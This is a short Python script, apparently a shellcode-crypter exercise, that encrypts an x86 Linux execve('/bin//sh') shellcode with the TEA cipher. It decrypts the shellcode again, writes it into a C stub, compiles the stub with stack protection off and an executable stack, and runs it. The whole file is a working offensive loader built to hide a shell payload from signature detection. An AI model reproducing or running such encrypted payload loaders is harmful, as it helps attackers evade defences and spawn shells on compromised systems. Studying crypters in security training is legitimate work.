#!/usr/bin/python

from pytea import TEA
import os
import binascii
import ctypes
import time

key = os.urandom(16)
print('current key: ', key)
tea = TEA(key)
execve = b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
e = tea.encrypt(execve)
e_hex = binascii.hexlify(e)

print('Encrypted Hex Shellcode: ' +  e_hex)
time.sleep(1)

print('Decrypting And Executing')
time.sleep(1)
decrypted = tea.decrypt(e)

print('Decrypted Shellcode: ' + decrypted)

shellfile = open("shellcode.c", "w")
shellfile.write("""#include<stdio.h>

#include<string.h>

unsigned char code[] = \\
\"""")
shellfile.close()
shellfile = open("shellcode.c", "a")
shellfile.write(decrypted)
shellfile.close()
shellfile = open("shellcode.c", "a")
shellfile.write("""";

main()
{

        printf(\"Shellcode Length:  %d\\n\", strlen(code));

        int (*ret)() = (int(*)())code;
        ret();

}""")

shellfile.close()

os.system("gcc -fno-stack-protector -z execstack shellcode.c -o shellcode && ./shellcode")
